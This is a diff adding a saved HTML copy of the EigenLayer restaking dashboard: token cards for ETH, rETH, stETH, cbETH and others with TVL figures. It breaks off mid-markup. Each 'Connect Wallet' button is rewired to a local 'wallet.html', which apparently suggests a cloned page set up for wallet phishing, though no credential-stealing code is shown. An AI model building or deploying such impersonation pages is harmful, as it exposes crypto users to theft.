@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="en"
+  style="--wcm-color-fg-1: rgb(228,231,231); --wcm-color-fg-2: rgb(148,158,158); --wcm-color-fg-3: rgb(110,119,119); --wcm-color-bg-1: rgb(20,20,20); --wcm-color-bg-2: rgb(39,42,42); --wcm-color-bg-3: rgb(59,64,64); --wcm-color-overlay: rgba(255,255,255,0.1); --wcm-accent-color: #3396FF; --wcm-accent-fill-color: #FFFFFF; --wcm-z-index: 89; --wcm-background-color: #3396FF; --wcm-background-border-radius: 8px; --wcm-container-border-radius: 30px; --wcm-wallet-icon-border-radius: 15px; --wcm-wallet-icon-large-border-radius: 30px; --wcm-wallet-icon-small-border-radius: 7px; --wcm-input-border-radius: 28px; --wcm-button-border-radius: 10px; --wcm-notification-border-radius: 36px; --wcm-secondary-button-border-radius: 28px; --wcm-icon-button-border-radius: 50%; --wcm-button-hover-highlight-border-radius: 10px; --wcm-text-big-bold-size: 20px; --wcm-text-big-bold-weight: 600; --wcm-text-big-bold-line-height: 24px; --wcm-text-big-bold-letter-spacing: -0.03em; --wcm-text-big-bold-text-transform: none; --wcm-text-xsmall-bold-size: 10px; --wcm-text-xsmall-bold-weight: 700; --wcm-text-xsmall-bold-line-height: 12px; --wcm-text-xsmall-bold-letter-spacing: 0.02em; --wcm-text-xsmall-bold-text-transform: uppercase; --wcm-text-xsmall-regular-size: 12px; --wcm-text-xsmall-regular-weight: 600; --wcm-text-xsmall-regular-line-height: 14px; --wcm-text-xsmall-regular-letter-spacing: -0.03em; --wcm-text-xsmall-regular-text-transform: none; --wcm-text-small-thin-size: 14px; --wcm-text-small-thin-weight: 500; --wcm-text-small-thin-line-height: 16px; --wcm-text-small-thin-letter-spacing: -0.03em; --wcm-text-small-thin-text-transform: none; --wcm-text-small-regular-size: 14px; --wcm-text-small-regular-weight: 600; --wcm-text-small-regular-line-height: 16px; --wcm-text-small-regular-letter-spacing: -0.03em; --wcm-text-small-regular-text-transform: none; --wcm-text-medium-regular-size: 16px; --wcm-text-medium-regular-weight: 600; --wcm-text-medium-regular-line-height: 20px; --wcm-text-medium-regular-letter-spacing: -0.03em; --wcm-text-medium-regular-text-transform: none; --wcm-font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, Ubuntu, 'Helvetica Neue', sans-serif; --wcm-font-feature-settings: 'tnum' on, 'lnum' on, 'case' on; --wcm-success-color: rgb(38,181,98); --wcm-error-color: rgb(242, 90, 103); --wcm-overlay-background-color: rgba(0, 0, 0, 0.3); --wcm-overlay-backdrop-filter: none;"
+>
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="stylesheet" href="6421c3f3858115fb.css" data-precedence="next">
+  <meta name="next-size-adjust">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style type="text/css">
+    @font-face {
+      font-family: "NunitoSans";
+      src: url("") format('truetype');
+      font-weight: 500;
+      font-style: normal;
+    }
+
+    @font-face {
+      font-family: "NunitoSans";
+      src: url("") format('truetype');
+      font-weight: 300;
+      font-style: normal;
+    }
+  </style>
+  <script
+    data-scrapbook-elem="custom-elements-loader">(function (names) { if (!customElements) { return; } for (const name of names) { customElements.define(name, class CustomElement extends HTMLElement { }); } })(["next-route-announcer", "wcm-explorer-context", "wcm-theme-context", "wcm-modal"])</script>
+</head>
+
+<body id="root" class="__className_0c2bb7 __variable_0c2bb7 __variable_c67eb6 bg-primaryBg text-primaryFg"
+  mouseup_handler="true">
+  <div class="flex flex-row justify-between items-center p-2 bg-info false"><button
+      class="absolute w-3 h-3 text-secondaryBg"><svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M13 1L1 13M1 1L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+          stroke-linejoin="round"></path>
+      </svg></button>
+    <div class="flex flex-row ml-auto sm:mx-auto text-secondaryBg"><span
+        class="text-TextXS font-abcRepro sm:text-TextM ml-6">Liquid Restaking deposits on EigenLayer are currently
+        paused. Native restaking is uncapped. Withdrawals remain enabled.</span></div>
+  </div>
+  <div class="flex items-center justify-between px-2 border-b h-14 lg:h-16 sm:px-4 bg-primaryBg border-b-disabledFg"><a
+      href="">
+      <div class="relative block w-12 h-12 lg:h-16"><img alt="eigenlayer logo" loading="lazy" decoding="async"
+          data-nimg="fill" src="markDarkA.svg"
+          style="position: absolute; height: 100%; width: 100%; inset: 0px; color: transparent;"></div>
+    </a>
+    <div class="flex items-center"><button type="button" aria-haspopup="dialog" aria-expanded="false"
+        aria-controls="radix-:r0:" data-state="closed"><button type="button" aria-haspopup="dialog"
+          aria-expanded="false" aria-controls="radix-:r3:" data-state="closed"><button
+            class="h-fit font-ibmPlexMono inline-block focus:border-borderFocus focus:shadow-[0px_0px_0px_4px_rgba(255,255,255,0.24)] outline-none bg-interactivePrimary border-2 border-transparent hover:bg-interactivePrimaryHover active:bg-interactivePrimaryPress focus:bg-interactivePrimaryFocus text-inversePrimaryFg px-4 py-2 text-ShortTextS w-fit"
+            type="button" aria-label="connectWallet"><a href="./wallet.html">Connect Wallet</a></button></button></button><button type="button"
+        aria-haspopup="dialog" aria-expanded="false" aria-controls="radix-:r4:" data-state="closed"><button
+          class="outline-none h-fit w-fit inline-block focus:shadow-[0px_0px_0px_4px_rgba(255,255,255,0.24)] outline-none bg-interactivePrimary border-2 border-transparent hover:bg-interactivePrimaryHover active:bg-interactivePrimaryPress focus:bg-interactivePrimaryFocus text-inversePrimaryFg hover:text-inverseTertiaryFg p-2 text-ShortTextS ml-2">
+          <div class="flex items-center justify-center w-5 h-5"><svg width="24" height="24" viewBox="0 0 24 24"
+              fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M3 12H21M3 6H21M3 18H21" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                stroke-linejoin="round"></path>
+            </svg></div>
+        </button></button></div>
+  </div>
+  <div class="mx-4 mt-8 mb-24 sm:mx-10 sm:mt-10">
+    <div class="flex flex-col items-center justify-center w-full gap-8">
+      <div class="flex flex-col items-center justify-center w-full h-auto gap-4 sm:h-36 lg:h-40 sm:flex-row">
+        <div class="flex-col items-center justify-center hidden w-full h-full gap-4 sm:flex"><span
+            class="text-Heading2 font-abcRepro">To start restaking</span><button type="button" aria-haspopup="dialog"
+            aria-expanded="false" aria-controls="radix-:r7:" data-state="closed"><button type="button"
+              aria-haspopup="dialog" aria-expanded="false" aria-controls="radix-:ra:" data-state="closed"><button
+                class="h-fit font-ibmPlexMono inline-block focus:border-borderFocus focus:shadow-[0px_0px_0px_4px_rgba(255,255,255,0.24)] outline-none bg-interactivePrimary border-2 border-transparent hover:bg-interactivePrimaryHover active:bg-interactivePrimaryPress focus:bg-interactivePrimaryFocus text-inversePrimaryFg px-4 py-2 text-ShortTextS w-fit"
+                type="button" aria-label="connectWallet"><a href="./wallet.html">Connect Wallet</a></button></button></button></div>
+        <div class="flex flex-col items-center justify-center w-full h-full gap-4 py-6 sm:hidden"><span
+            class="text-Heading3 font-abcRepro text-center">Connect your wallet to start restaking</span></div>
+      </div>
+      <div class="flex flex-col w-full gap-1"><span class="text-LabelL font-abcRepro mb-2 text-secondaryFg">Native
+          Restaking</span><a aria-label="ETH" href="https://app.eigenlayer.xyz/token/ETH">
+          <div
+            class="flex flex-col items-start justify-between gap-6 p-6 rounded-lg lg:flex-row lg:items-center bg-interactiveQuarternary hover:bg-interactiveQuarternaryHover">
+            <div class="flex items-center w-full gap-4 lg:w-auto">
+              <div class="relative w-8 h-8"><img alt="tokenIcon/beaconChainETH.svg" loading="lazy" decoding="async"
+                  data-nimg="fill" class="object-contain" src="beaconChainETH.svg"
+                  style="position: absolute; height: 100%; width: 100%; inset: 0px; color: transparent;"></div>
+              <div class="flex gap-2 mr-4 text-start"><span class="text-Heading3 font-abcRepro">Beacon Chain
+                  Ether</span>
+                <div
+                  class="rounded-full py-1.5 px-3 w-fit flex items-center justify-center text-inversePrimaryFg bg-accentPurple max-h-8">
+                  <span class="text-ShortTextXS font-ibmPlexMono">ETH</span></div>
+              </div><button
+                class="h-fit font-ibmPlexMono inline-block focus:border-borderFocus focus:shadow-[0px_0px_0px_4px_rgba(255,255,255,0.24)] outline-none bg-interactivePrimary opacity-50 border-2 border-transparent cursor-not-allowed text-inversePrimaryFg px-3 py-1.5 text-ShortTextXS w-fit hidden lg:block"
+                type="button" disabled="">Create EigenPod</button>
+            </div>
+            <div
+              class="flex flex-col justify-start w-1/3 h-20 px-0 py-4 border-t lg:h-auto lg:py-0 lg:pl-4 lg:w-40 lg:border-l lg:border-t-0 border-accentGreen">
+              <span class="text-LabelM font-abcRepro false">459,616.0000</span><span
+                class="font-ibmPlexMono text-ShortTextXS lg:text-ShortTextS text-tertiaryFg">TVL</span></div><button
+              class="h-fit font-ibmPlexMono inline-block focus:border-borderFocus focus:shadow-[0px_0px_0px_4px_rgba(255,255,255,0.24)] outline-none bg-interactivePrimary opacity-50 border-2 border-transparent cursor-not-allowed text-inversePrimaryFg px-4 py-2 text-ShortTextS w-fit block lg:hidden"
+              type="button" disabled="">Create EigenPod</button>
+          </div>
+        </a>
+        <div data-orientation="horizontal" role="separator" class="w-full my-6 bg-borderDivider h-[1px]"></div>
+        <div class="flex flex-col items-start justify-start w-full mb-2 sm:items-center sm:justify-between sm:flex-row">
+          <span class="text-LabelL font-abcRepro mb-1 text-secondaryFg whitespace-nowrap sm:mb-0">Liquid
+            Restaking</span><button type="button" id="radix-:rb:" aria-haspopup="menu" aria-expanded="false"
+            data-state="closed" class="flex justify-end w-full outline-none">
+            <div
+              class="flex items-center caret-accentGreen bg-inputBg hover:bg-inputHover focus-within:bg-inputFocus rounded text-primaryFg border-1 border-transparent outline-none focus-within:outline-1 focus-within:outline-accentGreen active:bg-inputFocus focus-within:bg-primaryBg placeholder:text-disabledFg font-abcRepro focus-within:shadow-[0px_0px_0px_4px_rgba(255,255,255,0.24)] px-4 py-2 text-TextS w-full max-w-auto sm:max-w-[225px] cursor-pointer outline-none">
+              <input
+                class="bg-transparent outline-none w-full cursor-pointer outline-none text-ShortTextS text-tertiaryFg"
+                value="Sort by: Random">
+              <div class="flex items-center justify-center h-3.5 w-3.5">
+                <div class="rotate-90 center h-3.5 w-3.5"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"
+                    fill="none">
+                    <path d="M9 18L15 12L9 6" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                      stroke-linejoin="round"></path>
+                  </svg></div>
+              </div>
+            </div>
+          </button></div><a aria-label="rETH" href="https://app.eigenlayer.xyz/token/rETH">
+          <div
+            class="p-6 flex flex-col lg:flex-row items-start gap-6 lg:items-center justify-between rounded-lg bg-interactiveQuarternary hover:bg-interactiveQuarternaryHover">
+            <div class="flex items-center w-full gap-4 lg:w-auto"><img alt="tokenIcon/rETH.svg" loading="lazy"
+                width="32" height="32" decoding="async" data-nimg="1" src="rETH.svg" style="color: transparent;">
+              <div class="flex gap-2 text-start"><span class="text-Heading3 font-abcRepro">Rocket Pool Ether</span>
+                <div
+                  class="rounded-full py-1.5 px-3 w-fit flex items-center justify-center text-inversePrimaryFg bg-accentPurple max-h-8">
+                  <span class="text-ShortTextXS font-ibmPlexMono">rETH</span></div>
+              </div>
+            </div>
+            <div class="flex flex-col items-start w-full gap-6 lg:w-auto lg:items-center lg:flex-row text-start">
+              <div class="flex items-center w-full lg:w-auto">
+                <div
+                  class="flex flex-col justify-start w-1/3 h-20 px-0 py-4 border-t whitespace-nowrap lg:h-auto lg:py-0 lg:pl-4 lg:w-40 lg:border-l lg:border-t-0 border-accentGreen">
+                  <span class="text-LabelM font-abcRepro text-disabledFg">0.0000</span><span
+                    class="text-ShortTextS font-ibmPlexMono hidden lg:block text-tertiaryFg">Restaked</span><span
+                    class="text-ShortTextXS font-ibmPlexMono block whitespace-normal lg:hidden text-tertiaryFg">Restaked</span>
+                </div>
+                <div
+                  class="flex flex-col justify-start w-1/3 h-20 px-0 py-4 border-t whitespace-nowrap lg:h-auto lg:py-0 lg:pl-4 lg:w-40 lg:border-l lg:border-t-0 border-accentGreen">
+                  <span class="text-LabelM font-abcRepro text-disabledFg">0.0000</span><span
+                    class="text-ShortTextS font-ibmPlexMono hidden lg:block text-tertiaryFg">Restaked Points</span><span
+                    class="text-ShortTextXS font-ibmPlexMono block whitespace-normal lg:hidden text-tertiaryFg">Restaked
+                    Points</span></div>
+                <div
+                  class="flex flex-col justify-start w-1/3 h-20 px-0 py-4 border-t whitespace-nowrap lg:h-auto lg:py-0 lg:pl-4 lg:w-40 lg:border-l lg:border-t-0 border-accentGreen">
+                  <span class="text-LabelM font-abcRepro false">52,298.2135</span><span
+                    class="text-ShortTextS font-ibmPlexMono hidden lg:block text-tertiaryFg">TVL</span><span
+                    class="text-ShortTextXS font-ibmPlexMono block whitespace-normal lg:hidden text-tertiaryFg">TVL</span>
+                </div>
+              </div><button
+                class="h-fit font-ibmPlexMono inline-block focus:border-borderFocus focus:shadow-[0px_0px_0px_4px_rgba(255,255,255,0.24)] outline-none bg-interactivePrimary border-2 border-transparent hover:bg-interactivePrimaryHover active:bg-interactivePrimaryPress focus:bg-interactivePrimaryFocus text-inversePrimaryFg px-4 py-2 text-ShortTextS w-fit block lg:hidden"
+                type="button">Manage Stake</button>
+            </div>
+          </div>
+        </a><a aria-label="stETH" href="https://app.eigenlayer.xyz/token/stETH">
+          <div
+            class="p-6 flex flex-col lg:flex-row items-start gap-6 lg:items-center justify-between rounded-lg bg-primaryBg hover:bg-interactiveQuarternaryHover">
+            <div class="flex items-center w-full gap-4 lg:w-auto"><img alt="tokenIcon/stETH.svg" loading="lazy"
+                width="32" height="32" decoding="async" data-nimg="1" src="stETH.svg" style="color: transparent;">
+              <div class="flex gap-2 text-start"><span class="text-Heading3 font-abcRepro">Lido Staked Ether</span>
+                <div
+                  class="rounded-full py-1.5 px-3 w-fit flex items-center justify-center text-inversePrimaryFg bg-accentPurple max-h-8">
+                  <span class="text-ShortTextXS font-ibmPlexMono">stETH</span></div>
+              </div>
+            </div>
+            <div class="flex flex-col items-start w-full gap-6 lg:w-auto lg:items-center lg:flex-row text-start">
+              <div class="flex items-center w-full lg:w-auto">
+                <div
+                  class="flex flex-col justify-start w-1/3 h-20 px-0 py-4 border-t whitespace-nowrap lg:h-auto lg:py-0 lg:pl-4 lg:w-40 lg:border-l lg:border-t-0 border-accentGreen">
+                  <span class="text-LabelM font-abcRepro text-disabledFg">0.0000</span><span
+                    class="text-ShortTextS font-ibmPlexMono hidden lg:block text-tertiaryFg">Restaked</span><span
+                    class="text-ShortTextXS font-ibmPlexMono block whitespace-normal lg:hidden text-tertiaryFg">Restaked</span>
+                </div>
+                <div
+                  class="flex flex-col justify-start w-1/3 h-20 px-0 py-4 border-t whitespace-nowrap lg:h-auto lg:py-0 lg:pl-4 lg:w-40 lg:border-l lg:border-t-0 border-accentGreen">
+                  <span class="text-LabelM font-abcRepro text-disabledFg">0.0000</span><span
+                    class="text-ShortTextS font-ibmPlexMono hidden lg:block text-tertiaryFg">Restaked Points</span><span
+                    class="text-ShortTextXS font-ibmPlexMono block whitespace-normal lg:hidden text-tertiaryFg">Restaked
+                    Points</span></div>
+                <div
+                  class="flex flex-col justify-start w-1/3 h-20 px-0 py-4 border-t whitespace-nowrap lg:h-auto lg:py-0 lg:pl-4 lg:w-40 lg:border-l lg:border-t-0 border-accentGreen">
+                  <span class="text-LabelM font-abcRepro false">195,463.5867</span><span
+                    class="text-ShortTextS font-ibmPlexMono hidden lg:block text-tertiaryFg">TVL</span><span
+                    class="text-ShortTextXS font-ibmPlexMono block whitespace-normal lg:hidden text-tertiaryFg">TVL</span>
+                </div>
+              </div><button
+                class="h-fit font-ibmPlexMono inline-block focus:border-borderFocus focus:shadow-[0px_0px_0px_4px_rgba(255,255,255,0.24)] outline-none bg-interactivePrimary border-2 border-transparent hover:bg-interactivePrimaryHover active:bg-interactivePrimaryPress focus:bg-interactivePrimaryFocus text-inversePrimaryFg px-4 py-2 text-ShortTextS w-fit block lg:hidden"
+                type="button">Manage Stake</button>
+            </div>
+          </div>
+        </a><a aria-label="cbETH" href="https://app.eigenlayer.xyz/token/cbETH">
+          <div
+            class="p-6 flex flex-col lg:flex-row items-start gap-6 lg:items-center justify-between rounded-lg bg-interactiveQuarternary hover:bg-interactiveQuarternaryHover">
+            <div class="flex items-center w-full gap-4 lg:w-auto"><img alt="tokenIcon/cbETH.svg" loading="lazy"
+                width="32" height="32" decoding="async" data-nimg="1" src="cbETH.svg" style="color: transparent;">
+              <div class="flex gap-2 text-start"><span class="text-Heading3 font-abcRepro">Coinbase Staked Ether</span>
+                <div
+                  class="rounded-full py-1.5 px-3 w-fit flex items-center justify-center text-inversePrimaryFg bg-accentPurple max-h-8">
+                  <span class="text-ShortTextXS font-ibmPlexMono">cbETH</span></div>
+              </div>
+            </div>
+            <div class="flex flex-col items-start w-full gap-6 lg:w-auto lg:items-center lg:flex-row text-start">
+              <div class="flex items-center w-full lg:w-auto">
+                <div
+                  class="flex flex-col justify-start w-1/3 h-20 px-0 py-4 border-t whitespace-nowrap lg:h-auto lg:py-0 lg:pl-4 lg:w-40 lg:border-l lg:border-t-0 border-accentGreen">
+                  <span class="text-LabelM font-abcRepro text-disabledFg">0.0000</span><span
+                    class="text-ShortTextS font-ibmPlexMono hidden lg:block text-tertiaryFg">Restaked</span><span
+                    class="text-ShortTextXS font-ibmPlexMono block whitespace-normal lg:hidden text-tertiaryFg">Restaked</span>
+                </div>
+                <div
+                  class="flex flex-col justify-start w-1/3 h-20 px-0 py-4 border-t whitespace-nowrap lg:h-auto lg:py-0 lg:pl-4 lg:w-40 lg:border-l lg:border-t-0 border-accentGreen">
+                  <span class="text-LabelM font-abcRepro text-disabledFg">0.0000</span><span
+                    class="text-ShortTextS font-ibmPlexMono hidden lg:block text-tertiaryFg">Restaked Points</span><span
+                    class="text-ShortTextXS font-ibmPlexMono block whitespace-normal lg:hidden text-tertiaryFg">Restaked
+                    Points</span></div>
+                <div
+                  class="flex flex-col justify-start w-1/3 h-20 px-0 py-4 border-t whitespace-nowrap lg:h-auto lg:py-0 lg:pl-4 lg:w-40 lg:border-l lg:border-t-0 border-accentGreen">
+                  <span class="text-LabelM font-abcRepro false">25,174.4979</span><span
+                    class="text-ShortTextS font-ibmPlexMono hidden lg:block text-tertiaryFg">TVL</span><span
+                    class="text-ShortTextXS font-ibmPlexMono block whitespace-normal lg:hidden text-tertiaryFg">TVL</span>
+                </div>
+              </div><button
+                class="h-fit font-ibmPlexMono inline-block focus:border-borderFocus focus:shadow-[0px_0px_0px_4px_rgba(255,255,255,0.24)] outline-none bg-interactivePrimary border-2 border-transparent hover:bg-interactivePrimaryHover active:bg-interactivePrimaryPress focus:bg-interactivePrimaryFocus text-inversePrimaryFg px-4 py-2 text-ShortTextS w-fit block lg:hidden"
+                type="button">Manage Stake</button>
+            </div>
+          </div>
+        </a><a aria-label="wBETH" href="https://app.eigenlayer.xyz/token/wBETH">
+          <div
+            class="p-6 flex flex-col lg:flex-row items-start gap-6 lg:items-center justify-between rounded-lg bg-primaryBg hover:bg-interactiveQuarternaryHover">
+            <div class="flex items-center w-full gap-4 lg:w-auto"><img alt="tokenIcon/wbETH.webp" loading="lazy"
+                width="32" height="32" decoding="async" data-nimg="1" srcset="wbETH-1.png 1x, wbETH.png 2x"
+                src="wbETH.png" style="color: transparent;">
+              <div class="flex gap-2 text-start"><span class="text-Heading3 font-abcRepro">Binance Staked Ether</span>
+                <div
+                  class="rounded-full py-1.5 px-3 w-fit flex items-center justify-center text-inversePrimaryFg bg-accentPurple max-h-8">
+                  <span class="text-ShortTextXS font-ibmPlexMono">wBETH</span></div>
+              </div>
+            </div>
+            <div class="flex flex-col items-start w-full gap-6 lg:w-auto lg:items-center lg:flex-row text-start">
+              <div class="flex items-center w-full lg:w-auto">
+                <div
+                  class="flex flex-col justify-start w-1/3 h-20 px-0 py-4 border-t whitespace-nowrap lg:h-auto lg:py-0 lg:pl-4 lg:w-40 lg:border-l lg:border-t-0 border-accentGreen">
+                  <span class="text-LabelM font-abcRepro text-disabledFg">0.0000</span><span
+                    class="text-ShortTextS font-ibmPlexMono hidden lg:block text-tertiaryFg">Restaked</span><span
+                    class="text-ShortTextXS font-ibmPlexMono block whitespace-normal lg:hidden text-tertiaryFg">Restaked</span>
+                </div>
+                <div
+                  class="flex flex-col justify-start w-1/3 h-20 px-0 py-4 border-t whitespace-nowrap lg:h-auto lg:py-0 lg:pl-4 lg:w-40 lg:border-l lg:border-t-0 border-accentGreen">
+                  <span class="text-LabelM font-abcRepro text-disabledFg">0.0000</span><span
+                    class="text-ShortTextS font-ibmPlexMono hidden lg:block text-tertiaryFg">Restaked Points</span><span
+                    class="text-ShortTextXS font-ibmPlexMono block whitespace-normal lg:hidden text-tertiaryFg">Restaked
+                    Points</span></div>
+                <div
+                  class="flex flex-col justify-start w-1/3 h-20 px-0 py-4 border-t whitespace-nowrap lg:h-auto lg:py-0 lg:pl-4 lg:w-40 lg:border-l lg:border-t-0 border-accentGreen">
+                  <span class="text-LabelM font-abcRepro false">11,326.5036</span><span
+                    class="text-ShortTextS font-ibmPlexMono hidden lg:block text-tertiaryFg">TVL</span><span
+                    class="text-ShortTextXS font-ibmPlexMono block whitespace-normal lg:hidden text-tertiaryFg">TVL</span>
+                </div>
+              </div><button
+                class="h-fit font-ibmPlexMono inline-block focus:border-borderFocus focus:shadow-[0px_0px_0px_4px_rgba(255,255,255,0.24)] outline-none bg-interactivePrimary border-2 border-transparent hover:bg-interactivePrimaryHover active:bg-interactivePrimaryPress focus:bg-interactivePrimaryFocus text-inversePrimaryFg px-4 py-2 text-ShortTextS w-fit block lg:hidden"
+                type="button">Manage Stake</button>
+            </div>
+          </div>
+        </a><a aria-label="ETHx" href="https://app.eigenlayer.xyz/token/ETHx">
+          <div
+            class="p-6 flex flex-col lg:flex-row items-start gap-6 lg:items-center justify-between rounded-lg bg-interactiveQuarternary hover:bg-interactiveQuarternaryHover">
+            <div class="flex items-center w-full gap-4 lg:w-auto"><img alt="tokenIcon/staderx.webp" loading="lazy"
+                width="32" height="32" decoding="async" data-nimg="1" srcset="staderx-1.png 1x, staderx.png 2x"
+                src="staderx.png" style="color: transparent;">
+              <div class="flex gap-2 text-start"><span class="text-Heading3 font-abcRepro">Stader Staked Ether</span>
+                <div
+                  class="rounded-full py-1.5 px-3 w-fit flex items-center justify-center text-inversePrimaryFg bg-accentPurple max-h-8">
+                  <span class="text-ShortTextXS font-ibmPlexMono">ETHx</span></div>
+              </div>
+            </div>
+            <div class="flex flex-col items-start w-full gap-6 lg:w-auto lg:items-center lg:flex-row text-start">
+              <div class="flex items-center w-full lg:w-auto">
+                <div
+                  class="flex flex-col justify-start w-1/3 h-20 px-0 py-4 border-t whitespace-nowrap lg:h-auto lg:py-0 lg:pl-4 lg:w-40 lg:border-l lg:border-t-0 border-accentGreen">
+                  <span class="text-LabelM font-abcRepro text-disabledFg">0.0000</span><span
+                    class="text-ShortTextS font-ibmPlexMono hidden lg:block text-tertiaryFg">Restaked</span><span
+                    class="text-ShortTextXS font-ibmPlexMono block whitespace-normal lg:hidden text-tertiaryFg">Restaked</span>
+                </div>
+                <div
+                  class="flex flex-col justify-start w-1/3 h-20 px-0 py-4 border-t whitespace-nowrap lg:h-auto lg:py-0 lg:pl-4 lg:w-40 lg:border-l lg:border-t-0 border-accentGreen">
+                  <span class="text-LabelM font-abcRepro text-disabledFg">0.0000</span><span
+                    class="text-ShortTextS font-ibmPlexMono hidden lg:block text-tertiaryFg">Restaked Points</span><span
+                    class="text-ShortTextXS font-ibmPlexMono block whitespace-normal lg:hidden text-tertiaryFg">Restaked
+                    Points</span></div>
+                <div
+                  class="flex flex-col justify-start w-1/3 h-20 px-0 py-4 border-t whitespace-nowrap lg:h-auto lg:py-0 lg:pl-4 lg:w-40 lg:border-l lg:border-t-0 border-accentGreen">
+                  <span class="text-LabelM font-abcRepro false">43,158.5410</span><span
+                    class="text-ShortTextS font-ibmPlexMono hidden lg:block text-tertiaryFg">TVL</span><span
+                    class="text-ShortTextXS font-ibmPlexMono block whitespace-normal lg:hidden text-tertiaryFg">TVL</span>
+                </div>
+              </div><button
+                class="h-fit font-ibmPlexMono inline-block focus:border-borderFocus focus:shadow-[0px_0px_0px_4px_rgba(255,255,255,0.24)] outline-none bg-interactivePrimary border-2 border-transparent hover:bg-interactivePrimaryHover active:bg-interactivePrimaryPress focus:bg-interactivePrimaryFocus text-inversePrimaryFg px-4 py-2 text-ShortTextS w-fit block lg:hidden"
+                type="button">Manage Stake</button>
+            </div>
+          </div>
+        </a><a aria-label="osETH" href="https://app.eigenlayer.xyz/token/osETH">
+          <div
+            class="p-6 flex flex-col lg:flex-row items-start gap-6 lg:items-center justify-between rounded-lg bg-primaryBg hover:bg-interactiveQuarternaryHover">
+            <div class="flex items-center w-full gap-4 lg:w-auto"><img alt="tokenIcon/osETH.webp" loading="lazy"
+                width="32" height="32" decoding="async" data-nimg="1" srcset="osETH.png 1x, osETH-1.png 2x"
+                src="osETH-1.png" style="color: transparent;">
+              <div class="flex gap-2 text-start"><span class="text-Heading3 font-abcRepro">StakeWise Staked Ether</span>
+                <div
+                  class="rounded-full py-1.5 px-3 w-fit flex items-center justify-center text-inversePrimaryFg bg-accentPurple max-h-8">
+                  <span class="text-ShortTextXS font-ibmPlexMono">osETH</span></div>
+              </div>
+            </div>
+            <div class="flex flex-col items-start w-full gap-6 lg:w-auto lg:items-center lg:flex-row text-start">
+              <div class="flex items-center w-full lg:w-auto">
+                <div
+                  class="flex flex-col justify-start w-1/3 h-20 px-0 py-4 border-t whitespace-nowrap lg:h-auto lg:py-0 lg:pl-4 lg:w-40 lg:border-l lg:border-t-0 border-accentGreen">
+                  <span class="text-LabelM font-abcRepro text-disabledFg">0.0000</span><span
+                    class="text-ShortTextS font-ibmPlexMono hidden lg:block text-tertiaryFg">Restaked</span><span
+                    class="text-ShortTextXS font-ibmPlexMono block whitespace-normal lg:hidden text-tertiaryFg">Restaked</span>
+                </div>
+                <div
+                  class="flex flex-col justify-start w-1/3 h-20 px-0 py-4 border-t whitespace-nowrap lg:h-auto lg:py-0 lg:pl-4 lg:w-40 lg:border-l lg:border-t-0 border-accentGreen">
+                  <span class="text-LabelM font-abcRepro text-disabledFg">0.0000</span><span
+                    class="text-ShortTextS font-ibmPlexMono hidden lg:block text-tertiaryFg">Restaked Points</span><span
+                    class="text-ShortTextXS font-ibmPlexMono block whitespace-normal lg:hidden text-tertiaryFg">Restaked
+                    Points</span></div>
+                <div
+                  class="flex flex-col justify-start w-1/3 h-20 px-0 py-4 border-t whitespace-nowrap lg:h-auto lg:py-0 lg:pl-4 lg:w-40 lg:border-l lg:border-t-0 border-accentGreen">
+                  <span class="text-LabelM font-abcRepro false">15,655.2052</span><span
+                    class="text-ShortTextS font-ibmPlexMono hidden lg:block text-tertiaryFg">TVL</span><span
+                    class="text-ShortTextXS font-ibmPlexMono block whitespace-normal lg:hidden text-tertiaryFg">TVL</span>
+                </div>
+              </div><button
+                class="h-fit font-ibmPlexMono inline-block focus:border-borderFocus focus:shadow-[0px_0px_0px_4px_rgba(255,255,255,0.24)] outline-none bg-interactivePrimary border-2 border-transparent hover:bg-interactivePrimaryHover active:bg-interactivePrimaryPress focus:bg-interactivePrimaryFocus text-inversePrimaryFg px-4 py-2 text-ShortTextS w-fit block lg:hidden"
+                type="button">Manage Stake</button>
+            </div>
+          </div>
+        </a><a aria-label="swETH" href="https://app.eigenlayer.xyz/token/swETH">
+          <div
+            class="p-6 flex flex-col lg:flex-row items-start gap-6 lg:items-center justify-between rounded-lg bg-interactiveQuarternary hover:bg-interactiveQuarternaryHover">
+            <div class="flex items-center w-full gap-4 lg:w-auto"><img alt="tokenIcon/swETH.webp" loading="lazy"
+                width="32" height="32" decoding="async" data-nimg="1" srcset="swETH-1.jpg 1x, swETH.jpg 2x"
+                src="swETH.jpg" style="color: transparent;">
+              <div class="flex gap-2 text-start"><span class="text-Heading3 font-abcRepro">Swell Staked Ether</span>
+                <div
+                  class="rounded-full py-1.5 px-3 w-fit flex items-center justify-center text-inversePrimaryFg bg-accentPurple max-h-8">
+                  <span class="text-ShortTextXS font-ibmPlexMono">swETH</span></div>
+              </div>
+            </div>
+            <div class="flex flex-col items-start w-full gap-6 lg:w-auto lg:items-center lg:flex-row text-start">
+              <div class="flex items-center w-full lg:w-auto">
+                <div
+                  class="flex flex-col justify-start w-1/3 h-20 px-0 py-4 border-t whitespace-nowrap lg:h-auto lg:py-0 lg:pl-4 lg:w-40 lg:border-l lg:border-t-0 border-accentGreen">
+                  <span class="text-LabelM font-abcRepro text-disabledFg">0.0000</span><span
+                    class="text-ShortTextS font-ibmPlexMono hidden lg:block text-tertiaryFg">Restaked</span><span
+                    class="text-ShortTextXS font-ibmPlexMono block whitespace-normal lg:hidden text-tertiaryFg">Restaked</span>
+                </div>
+                <div
+                  class="flex flex-col justify-start w-1/3 h-20 px-0 py-4 border-t whitespace-nowrap lg:h-auto lg:py-0 lg:pl-4 lg:w-40 lg:border-l lg:border-t-0 border-accentGreen">
+                  <span class="text-LabelM font-abcRepro text-disabledFg">0.0000</span><span
+                    class="text-ShortTextS font-ibmPlexMono hidden lg:block text-tertiaryFg">Restaked Points</span><span
+                    class="text-ShortTextXS font-ibmPlexMono block whitespace-normal lg:hidden text-tertiaryFg">Restaked
+                    Points</span></div>
+                <div
+                  class="flex flex-col justify-start w-1/3 h-20 px-0 py-4 border-t whitespace-nowrap lg:h-auto lg:py-0 lg:pl-4 lg:w-40 lg:border-l lg:border-t-0 border-accentGreen">
